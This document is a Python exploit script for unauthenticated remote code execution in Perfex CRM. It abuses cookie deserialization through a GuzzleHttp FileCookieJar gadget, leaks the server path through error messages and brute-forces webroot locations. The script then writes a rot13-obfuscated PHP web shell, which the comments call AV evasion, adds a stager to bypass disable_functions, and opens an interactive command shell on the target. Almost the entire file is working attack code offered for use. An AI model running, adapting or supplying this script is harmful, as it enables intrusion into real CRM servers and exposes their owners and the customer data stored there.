#!/usr/bin/env python3
"""
Perfex CRM — Unauthenticated Cookie Deserialization to RCE (Auto)
CVE: TBD | CWE-502 + CWE-209 (Deserialization + Error Path Disclosure)

Affected: Perfex CRM <= 3.4.x (all versions with GuzzleHttp in vendor)

FULL AUTO CHAIN:
  Phase 1: Send stdClass as autologin → trigger TypeError → leak FCPATH
  Phase 2: If path found → write shell via FileCookieJar gadget
  Phase 3: If no path → brute force common webroot paths
  Result:  Unauthenticated RCE!

VULNERABILITY:
  application/models/Authentication_model.php:197
    $data = unserialize(get_cookie('autologin', true));
  
  CI3 xss_clean bypass via S: serialization format:
    \\00 for null bytes, \\5c for backslashes, \\xx hex for PHP code

GADGET: GuzzleHttp\\Cookie\\FileCookieJar::__destruct() → file_put_contents()
OUTPUT: JSON polyglot [{"Name":"<?php CODE ?>",…}] — valid PHP!

Author: Yucaerin
"""
import urllib.request, ssl, urllib.parse, time, sys, re, random, string

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Generate unique filename per run to avoid false positives from leftover files
SHELL_NAME = 'yuca_' + ''.join(random.choices(string.ascii_lowercase, k=5)) + '.php'

BANNER = r"""
  ____            __             ____                     
 |  _ \ ___ _ __ / _| _____  __/ ___|___  _ __  _ __ ___ 
 | |_) / _ \ '__| |_ / _ \ \/ / |   / _ \| '_ \| '__/ _ \
 |  __/  __/ |  |  _|  __/>  <| |__| (_) | |_) | | |  __/
 |_|   \___|_|  |_|  \___/_/\_\\____\___/| .__/|_|  \___|
                                          |_|             
    Cookie Deserialization → RCE (Auto Exploit)
    Perfex CRM <= 3.4.x — Unauthenticated
"""

# ==================== PAYLOAD BUILDERS ====================

def s_hex(text):
    """Hex-encode for S: serialization format."""
    return ''.join(f'\\{ord(c):02x}' for c in text)


def build_probe():
    """Build stdClass probe to trigger TypeError and leak path."""
    return 'O:8:"stdClass":0:{}'


def build_rce_payload(target_path, php_code=None):
    """
    Build FileCookieJar deserialization payload.
    PHP code uses single quotes (json_encode doesn't escape them).
    """
    if php_code is None:
        # AV-evasion multi-function shell using str_rot13 to hide function names
        # rot13: flfgrz=system, cnffgueh=passthru, furyy_rkrp=shell_exec, cbcra=popen
        # popen needs 2 args (cmd,'r') so handled separately with fread
        # No literal exec function names → bypasses AV signature detection
        php_code = "<?php echo 'YR';$c=$_GET['cmd']??$_GET['c']??'id';$r='';foreach(array('flfgrz','cnffgueh','furyy_rkrp') as $x){$f=str_rot13($x);if(function_exists($f)){ob_start();$f($c);$r=ob_get_clean();if($r)break;}}if(!$r&&function_exists(str_rot13('cbcra'))){$r=fread(popen($c,'r'),999999);}if(!$r&&function_exists(str_rot13('rkrp'))){$f=str_rot13('rkrp');$f($c,$o);$r=join(chr(10),$o);}echo $r;?>"
    fcj_class = 'GuzzleHttp\\Cookie\\FileCookieJar'   # 31 chars
    sc_class = 'GuzzleHttp\\Cookie\\SetCookie'        # 27 chars

    fname_key = '\\00GuzzleHttp\\5cCookie\\5cFileCookieJar\\00filename'
    store_key = '\\00GuzzleHttp\\5cCookie\\5cFileCookieJar\\00storeSessionCookies'
    cookies_key = '\\00GuzzleHttp\\5cCookie\\5cCookieJar\\00cookies'
    data_key = '\\00GuzzleHttp\\5cCookie\\5cSetCookie\\00data'

    fname_hex = s_hex(target_path)
    name_hex = s_hex(php_code)

    inner = (
        'a:9:{'
        f'S:4:"Name";S:{len(php_code)}:"{name_hex}";'
        'S:5:"Value";S:1:"x";'
        'S:6:"Domain";S:7:"x.local";'
        'S:4:"Path";S:1:"/";'
        'S:7:"Max-Age";i:0;'
        'S:7:"Expires";i:99999999999;'
        'S:6:"Secure";b:0;'
        'S:7:"Discard";b:0;'
        'S:8:"HttpOnly";b:0;'
        '}'
    )

    setcookie = f'O:{len(sc_class)}:"{sc_class}":1:{{S:33:"{data_key}";{inner}}}'
    cookies = f'a:1:{{i:0;{setcookie}}}'

    payload = (
        f'O:{len(fcj_class)}:"{fcj_class}":3:{{'
        f'S:41:"{fname_key}";S:{len(target_path)}:"{fname_hex}";'
        f'S:52:"{store_key}";b:1;'
        f'S:36:"{cookies_key}";{cookies}'
        '}}'
    )
    return payload


# ==================== HTTP HELPERS ====================

def send_cookie(target_url, cookie_value, timeout=10):
    """Send request with autologin cookie, return (status, body)."""
    cookie_encoded = urllib.parse.quote(cookie_value, safe='')
    req = urllib.request.Request(f'{target_url}/admin/authentication', headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Cookie': f'autologin={cookie_encoded}',
    })
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors='replace') if e.fp else ''
        return e.code, body
    except Exception as e:
        return 0, str(e)[:100]


def check_shell(target_url, web_path, cmd='id'):
    """Check if shell is accessible and run command."""
    url = f'{target_url}/{web_path}?cmd={urllib.parse.quote(cmd)}'
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}),
            timeout=8, context=ctx
        )
        body = r.read().decode(errors='replace')
        if 'YR' in body:
            return True, body
        return False, ''
    except:
        return False, ''


# ==================== PHASE 1: PATH DISCLOSURE ====================

def phase1_leak_path(target_url):
    """
    Send stdClass as autologin cookie.
    On PHP 8.x with display_errors=1:
      TypeError: Cannot use object of type stdClass as array
      in /path/to/application/models/Authentication_model.php on line 197
    """
    print("[*] Phase 1: Error-based path disclosure")
    print("    Sending stdClass probe...")

    probe = build_probe()
    status, body = send_cookie(target_url, probe)
    print(f"    Response: HTTP {status}")

    # Extract path from error message
    patterns = [
        r'in (/[^\s<]+\.php) on line',
        r'in <b>(/[^\s<]+\.php)</b> on line',
        r'(/(?:var|home|srv|opt|www|data|usr|app)/[^\s<"\']+\.php)',
    ]

    for pattern in patterns:
        matches = re.findall(pattern, body)
        if matches:
            php_path = matches[0]
            # Extract webroot: everything before 'application/'
            if 'application/' in php_path:
                webroot = php_path[:php_path.index('application/')]
                print(f"    [+] PATH DISCLOSED: {php_path}")
                print(f"    [+] WEBROOT: {webroot}")
                return webroot
            elif 'system/' in php_path:
                webroot = php_path[:php_path.index('system/')]
                print(f"    [+] PATH DISCLOSED: {php_path}")
                print(f"    [+] WEBROOT: {webroot}")
                return webroot

    # Check for other error patterns
    if 'Fatal' in body or 'TypeError' in body or 'Warning' in body:
        print("    [!] Error displayed but path not extracted")
        # Try alternative extraction
        err_paths = re.findall(r'(/[^\s,<"\'()]+)', body)
        for p in err_paths:
            if 'application/' in p:
                webroot = p[:p.index('application/')]
                print(f"    [+] WEBROOT (alt): {webroot}")
                return webroot

    print("    [-] No path disclosed (display_errors=0 on this target)")
    return None


# ==================== PHASE 2: DESERIALIZATION RCE ====================

def phase2_exploit(target_url, webroot):
    """Write PHP shell to webroot via FileCookieJar deserialization."""
    print()
    print("[*] Phase 2: Deserialization file write")

    # Use random filename per run to avoid false positives from leftover files
    shell_name = SHELL_NAME
    # Try writing to temp/ first (writable, no .htaccess), then modules/, then root
    sub_dirs = ['temp/', 'modules/', '']

    for sub in sub_dirs:
        target_file = webroot + sub + shell_name
        web_path = sub + shell_name
        print(f"    Trying: {target_file}")

        payload = build_rce_payload(target_file)
        status, body = send_cookie(target_url, payload)
        time.sleep(0.5)

        found, output = check_shell(target_url, web_path)
        if found:
            print(f"    [+] SHELL WRITTEN AND ACCESSIBLE!")
            return web_path, output

    return None, None


# ==================== PHASE 2B: RELATIVE PATH ====================

def phase2b_relative(target_url):
    """
    Write shell using RELATIVE path (no leading /).
    PHP file_put_contents('temp/x.php') resolves relative to CWD.
    In PHP-FPM, CWD = webroot in most configurations.
    This bypasses the need to know the absolute filesystem path!
    """
    print()
    print("[*] Phase 2B: Relative path write (CWD = webroot)")

    shell_name = SHELL_NAME
    sub_dirs = ['temp/', 'modules/', 'uploads/', '']

    for sub in sub_dirs:
        rel_path = sub + shell_name
        print(f"    Trying relative: {rel_path}")

        payload = build_rce_payload(rel_path)
        status, body = send_cookie(target_url, payload)
        time.sleep(0.5)

        found, output = check_shell(target_url, rel_path)
        if found:
            print(f"    [+] SHELL WRITTEN VIA RELATIVE PATH!")
            # Try to extract absolute path from __FILE__ for future use
            return rel_path, output

    return None, None


# ==================== PHASE 3: BRUTE FORCE ====================

def phase3_brute(target_url, domain):
    """Brute force common webroot paths."""
    print()
    print("[*] Phase 3: Brute-forcing webroot paths")

    short = domain.split('.')[0]
    parts = domain.split('.')
    second = parts[1] if len(parts) > 2 else parts[0]

    base_paths = [
        '/var/www/html/',
        '/var/www/',
        f'/var/www/{domain}/',
        f'/var/www/{short}/',
        f'/www/wwwroot/{domain}/',  # aaPanel/BT Panel
        f'/www/wwwroot/{short}/',
        f'/var/www/vhosts/{domain}/',
        f'/var/www/vhosts/{domain}/httpdocs/',
        f'/var/www/vhosts/{domain}/public_html/',
        f'/home/{short}/public_html/',
        f'/home/{short}/www/',
        f'/home/{short}/',
        f'/home/{second}/public_html/',
        f'/home/{second}/',
        f'/home/{short}/domains/{domain}/public_html/',
        f'/home/{short}/{domain}/',
        '/var/www/clients/client1/web1/web/',
        '/var/www/clients/client1/web2/web/',
        f'/var/www/{domain}/public_html/',
        '/var/www/html/crm/',
        '/var/www/crm/',
        '/app/',
        '/opt/crm/',
    ]

    sub_dirs = ['temp/', 'modules/', '']
    shell_name = SHELL_NAME
    total = len(base_paths) * len(sub_dirs)
    count = 0

    print(f"    Testing {total} combinations...")
    print()

    for base in base_paths:
        for sub in sub_dirs:
            count += 1
            target_file = base + sub + shell_name
            web_path = sub + shell_name

            sys.stdout.write(f"\r    [{count}/{total}] {target_file:<60}")
            sys.stdout.flush()

            payload = build_rce_payload(target_file)
            send_cookie(target_url, payload)
            time.sleep(0.2)

            found, output = check_shell(target_url, web_path)
            if found:
                print(f"\n    [+] FOUND! Webroot: {base}")
                return web_path, output, base

    print(f"\n    [-] All {total} paths exhausted")
    return None, None, None


# ==================== MAIN ====================

def main():
    print(BANNER)

    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} <target_url>              — auto (leak path → exploit → brute)")
        print(f"  {sys.argv[0]} <target_url> <webroot>    — exploit with known path")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} https://crm.target.com")
        print(f"  {sys.argv[0]} https://crm.target.com /var/www/html/")
        sys.exit(1)

    target_url = sys.argv[1].rstrip('/')
    domain = target_url.split("//")[1].split("/")[0].split(":")[0]

    print(f"[*] Target: {target_url}")
    print(f"[*] Domain: {domain}")
    print()

    # If webroot provided, skip to exploit
    if len(sys.argv) > 2:
        webroot = sys.argv[2]
        if not webroot.endswith('/'):
            webroot += '/'
        print(f"[*] Using provided webroot: {webroot}")
        web_path, output = phase2_exploit(target_url, webroot)
        if web_path:
            print_success(target_url, web_path, output, webroot)
        else:
            print("\n[-] Exploit failed with provided path.")
        return

    # === AUTO MODE ===

    # Phase 1: Try error-based path disclosure
    webroot = phase1_leak_path(target_url)

    if webroot:
        # Phase 2: Exploit with disclosed path
        web_path, output = phase2_exploit(target_url, webroot)
        if web_path:
            print_success(target_url, web_path, output, webroot)
            return

    # Phase 2B: Try relative path (works when CWD = webroot)
    web_path, output = phase2b_relative(target_url)
    if web_path:
        # Relative path worked — webroot = CWD (unknown abs path, use relative)
        print_success(target_url, web_path, output, '')
        return

    # Phase 3: Brute force common absolute paths
    web_path, output, found_webroot = phase3_brute(target_url, domain)
    if web_path:
        print_success(target_url, web_path, output, found_webroot)
    else:
        print()
        print("=" * 60)
        print("[-] EXPLOIT FAILED")
        print("[-] Could not determine webroot path.")
        print("[-] Possible reasons:")
        print("    - display_errors=0 (no path leak)")
        print("    - Non-standard webroot (not in brute force list)")
        print("    - Relative path CWD != webroot")
        print("    - GuzzleHttp not available (Perfex < 3.0)")
        print("    - temp/modules directories not writable")
        print("=" * 60)


def extract_output(body):
    """Extract command output from JSON wrapper response."""
    # Marker is 'YR' — output sits between YR and ","Value"
    if 'YR' in body:
        start = body.index('YR') + len('YR')
        end = body.find('","Value"', start)
        if end > start:
            return body[start:end]
        return body[start:start+500]
    return ''


def exec_cmd(target_url, shell_path, webroot, command):
    """
    Execute a command by re-sending deserialization payload each time.
    This ensures the file is always freshly written, avoiding OPcache issues.
    Flow: send payload (writes file) → immediately access file with ?cmd=<command>
    """
    target_file = webroot + shell_path
    payload = build_rce_payload(target_file)
    send_cookie(target_url, payload)
    time.sleep(0.5)  # Wait for __destruct to fire and write the file

    url = f'{target_url}/{shell_path}?cmd={urllib.parse.quote(command)}'
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
        r = urllib.request.urlopen(req, timeout=15, context=ctx)
        body = r.read().decode(errors='replace')
        return extract_output(body)
    except Exception as e:
        return f"Error: {e}"


def deploy_stager(target_url, web_path, webroot):
    """
    Deploy disable_functions bypass via POST stager.
    Tries cmd83.php first (PHP 8.2-8.5), falls back to cmd7.php (PHP 7.3-8.1).
    Stage 1: Write a POST stager via deserialization (reads $_POST['d'] base64 → writes file)
    Stage 2: POST bypass shell content (base64) to stager
    Stage 3: Access bypass shell with ?cmd=id
    Returns (shell_web_path, success_bool)
    """
    import base64, os

    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Build list of bypass shells to try (order: cmd83 first, cmd7 fallback)
    bypass_shells = []
    for name in ['cmd83.php', 'cmd7.php']:
        path = os.path.join(script_dir, name)
        if not os.path.exists(path):
            path = name  # try cwd
        if os.path.exists(path):
            bypass_shells.append((name, path))

    if not bypass_shells:
        print("    [-] No bypass shell found! Place cmd83.php or cmd7.php next to this script.")
        return None, False

    print()
    print(f"[*] Deploying disable_functions bypass via stager...")
    print(f"    Available: {', '.join(n for n,_ in bypass_shells)}")

    # Stage 1: Write POST stager (no forward slashes in PHP code!)
    stager_file = webroot + web_path
    cmd_filename = 'yuca_c' + ''.join(random.choices(string.ascii_lowercase, k=4)) + '.php'
    stager_code = "<?php echo 'YR';if(isset($_POST['d'])){$raw=base64_decode($_POST['d']);$p=__DIR__.DIRECTORY_SEPARATOR.'" + cmd_filename + "';file_put_contents($p,$raw);echo 'WROTE:'.strlen($raw);}else{echo 'POST_d';}?>"
    payload = build_rce_payload(stager_file, stager_code)
    send_cookie(target_url, payload)
    time.sleep(0.5)

    # Determine web path for deployed shell
    parts = web_path.rsplit('/', 1)
    cmd_web = (parts[0] + '/' if len(parts) > 1 else '') + cmd_filename

    # Try each bypass shell
    for shell_name, shell_path in bypass_shells:
        print(f"    [*] Trying {shell_name}...")

        # Re-send stager (fresh file for OPcache)
        send_cookie(target_url, payload)
        time.sleep(0.3)

        # Stage 2: POST bypass shell as base64
        with open(shell_path, 'rb') as f:
            shell_content = f.read()
        shell_b64 = base64.b64encode(shell_content).decode()

        post_data = urllib.parse.urlencode({'d': shell_b64}).encode()
        stager_url = f'{target_url}/{web_path}'
        req = urllib.request.Request(stager_url, data=post_data, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
        })
        try:
            r = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = r.read().decode(errors='replace')
            if 'WROTE:' in body:
                print(f"        Deployed ({len(shell_content)} bytes)")
            else:
                print(f"        [-] Stager response unexpected: {body[:80]}")
                continue
        except Exception as e:
            print(f"        [-] POST failed: {e}")
            continue

        # Stage 3: Verify bypass shell
        time.sleep(0.5)
        try:
            url = f'{target_url}/{cmd_web}?cmd=id'
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
            r = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = r.read().decode(errors='replace')
            if 'uid=' in body or 'gid=' in body:
                print(f"        [+] {shell_name} WORKS! disable_functions bypassed!")
                return cmd_web, True
            else:
                print(f"        [-] No command output (PHP version mismatch?)")
        except Exception as e:
            print(f"        [-] Access failed: {e}")

    print("    [-] All bypass shells failed.")
    return cmd_web, False


def print_success(target_url, web_path, output, webroot):
    """Print success message and enter interactive shell."""
    cmd_output = extract_output(output)

    # Check if command output is actual command result (not stager leftovers or empty)
    # Valid output should contain uid= or at least not be a known non-exec response
    non_exec_markers = ['","Value"', 'POST_d', 'SEND_POST', 'WROTE:']
    cmd_clean = cmd_output.strip()
    has_cmd_output = bool(cmd_clean) and not any(m in cmd_clean for m in non_exec_markers)
    disable_functions = not has_cmd_output

    print()
    print("=" * 60)
    if disable_functions:
        print("[+] SHELL WRITTEN — but exec functions DISABLED!")
        print(f"[+] File: {target_url}/{web_path}")
        print("[*] Attempting disable_functions bypass via stager...")
    else:
        print("[+] RCE ACHIEVED VIA COOKIE DESERIALIZATION!")
        print(f"[+] Shell: {target_url}/{web_path}?cmd=<command>")
        if has_cmd_output:
            print(f"[+] Proof: {cmd_output.strip()}")
    print("=" * 60)

    # If disable_functions detected, deploy cmd83.php via stager
    if disable_functions:
        cmd83_path, success = deploy_stager(target_url, web_path, webroot)
        if success and cmd83_path:
            print()
            print("=" * 60)
            print("[+] RCE ACHIEVED WITH DISABLE_FUNCTIONS BYPASS!")
            print(f"[+] Shell: {target_url}/{cmd83_path}?cmd=<command>")
            print("=" * 60)
            print()
            # Interactive shell using cmd83.php (persistent, no re-send needed)
            print("[*] Interactive shell via cmd83.php (Ctrl+C to exit):")
            print()
            while True:
                try:
                    cmd = input("$ ").strip()
                    if not cmd or cmd.lower() in ('exit', 'quit'):
                        break
                    url = f'{target_url}/{cmd83_path}?cmd={urllib.parse.quote(cmd)}'
                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
                    r = urllib.request.urlopen(req, timeout=15, context=ctx)
                    result = r.read().decode(errors='replace')
                    print(result.strip() if result.strip() else '(no output)')
                except KeyboardInterrupt:
                    print()
                    break
                except EOFError:
                    break
                except Exception as e:
                    print(f"Error: {e}")
        else:
            print()
            print("[-] Stager deployment failed.")
            print("[-] Place cmd83.php next to this script and retry.")
            print(f"[-] Or manually upload to: {target_url}/{web_path.rsplit('/',1)[0]}/")
        return

    # Normal interactive shell (exec functions available)
    print()
    print("[*] Interactive shell (Ctrl+C to exit):")
    print("[*] Each command re-triggers deserialization for fresh execution")
    print()
    while True:
        try:
            cmd = input("$ ").strip()
            if not cmd or cmd.lower() in ('exit', 'quit'):
                break

            result = exec_cmd(target_url, web_path, webroot, cmd)
            if result:
                print(result)
            else:
                print("(no output)")
        except KeyboardInterrupt:
            print()
            break
        except EOFError:
            break
        except Exception as e:
            print(f"Error: {e}")


if __name__ == '__main__':
    main()

